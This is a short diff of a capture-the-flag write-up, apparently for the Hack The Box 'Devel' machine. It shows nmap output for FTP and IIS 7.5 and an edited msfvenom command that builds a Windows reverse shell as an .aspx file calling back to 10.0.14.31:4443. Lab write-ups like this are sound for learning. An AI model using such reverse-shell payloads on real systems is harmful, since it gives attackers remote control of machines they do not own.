@@ -22,7 +22,7 @@ PORT   STATE SERVICE VERSION
 | 03-17-17  05:37PM                  689 iisstart.htm
 |_03-17-17  05:37PM               184946 welcome.png
 | ftp-syst: 
-|_  SYST: Windows_NT
+|_  SYST: Windows_NT 
 80/tcp open  http    Microsoft IIS httpd 7.5
 |_http-title: IIS7
 |_http-server-header: Microsoft-IIS/7.5
@@ -115,7 +115,7 @@ Now, how can we exploit this?? We can go ahead to create a reverse shell and upl
 
 Lets create our reverse shell
 
-command:```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.14.31 LPORT=4444 -f war > runme.war```
+command:```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.14.31 LPORT=4443 -f aspx -o abeg.aspx```
 
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Devel]
